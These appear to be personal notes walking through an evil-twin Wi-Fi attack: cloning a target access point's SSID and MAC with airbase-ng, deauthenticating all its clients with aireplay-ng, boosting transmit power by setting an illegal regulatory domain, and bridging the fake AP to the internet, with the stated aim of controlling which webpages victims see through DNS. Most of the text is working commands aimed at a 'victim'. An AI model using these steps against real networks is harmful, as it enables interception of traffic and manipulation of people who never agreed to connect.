To clone an Access Point, deauthenticate all devices that were connecting to original AP, and let them connect to me.
Also, modify DNS server record and I can control what webpage they see.

Need tools:
- airbase-ng, for cloning
- aireplay-ng, to deauth devices

1. config wlp3s0
    ifconfig wlp3s0 down
    iwconfig wlp3s0 mode monitor
    airmon-ng check wlp3s0, kill the PIDs 
    airmon-ng start wlp3s0, to create mon0 interface dedicated for monitoring
2. airodump-ng wlp3s0, to scan all alive APs
    find the target AP's MAC, and channel
3. clone it using "airbase-ng -a [AP's MAC] --essid ["SSID Name"] -c [channel] mon0"
    This step creates a fake AP with same SSID & MAC as the original AP.
    mon0 is default, use airmon-ng start wlp3s0 to check mon0
4. deauth all devices connected to original AP, so that when they try to reconnect, they will connect to me
    aireplay-ng -0 0 -a [AP's MAC] mon0
    (to deauth a specific device, aireplay-ng -0 0 -a [AP's MAC] -c [device's MAC] wlp3s0)
    (may need to use "iwconfig wlp3s0 channel [#]" to change channel first)
    Note: My Fake AP's signal strength must be stronger in order for this to be successfull.

To power up my Fake AP,
    in /etc/NetworkManager/conf.d/default-wifi-powersave-on.conf, change the "wifi.powersave" value to 2
    iw reg set BO (set reg to Bolivian..., this is usually illegal!!!)
    iwconfig wlp3s0 txpower 27
    iwconfig to check if the configuration worked

Tried this, but for some reason, I can't make my victim device connect to my fake AP.
And for some reason, I can't change the txpower on wlp3s0.

Note, to do the following, I also need another network interface that HAS internet connectiong.
Because the wireless one (wlp3s0) is down at this moment, and mon0 is the fake AP interface I used in airbase command.

Then from here, config my fake AP to provide internet access.
1. apt-get install bridge-utils
2. brctl addbr evilTwin, to create a bridge
3. brctl addif evilTwin enp0s25, this is a wire interface and has internet connectiong, one end of evilTwin bridge is it
4. brctl addif evilTwin at0, at0 is airbase-ng created interface, the other end of evilTwin bridge is it
5. ifconfig at0 0.0.0.0 up
6. ifconfig evilTwin up
7. dhclient evil, 
After those steps, devices connecting to my Fake AP will have internet connection.
